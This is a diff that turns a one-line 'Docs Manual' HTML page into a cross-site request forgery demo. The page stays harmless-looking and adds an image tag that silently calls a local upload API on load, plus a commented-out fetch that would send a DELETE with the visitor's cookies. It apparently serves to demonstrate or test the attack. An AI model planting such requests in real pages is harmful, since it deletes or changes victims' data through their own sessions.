@@ -1,1 +1,23 @@
-<h1>Docs Manual</h1><p>The definitive guide.</p>
+<!DOCTYPE html>
+<html>
+
+<head>
+	<title>CSRF Attack Demo</title>
+</head>
+
+<body>
+	<h1>Docs Manual</h1>
+	<p>The definitive guide.</p>
+	<h1>Innocent Looking Page</h1>
+	<img src="http://localhost:8081/api/uploads">
+	<!-- <form method="GET" action="http://localhost:8081/api/uploads"></form> -->
+	<!-- <script>
+		// This automatically sends a DELETE request when the page loads
+		fetch('http://localhost:8081/api/uploads/87e5796fc2165b76.pdf', {
+			method: 'DELETE',
+			credentials: 'include'  // This sends any cookies along with the request
+		});
+	</script> -->
+</body>
+
+</html>
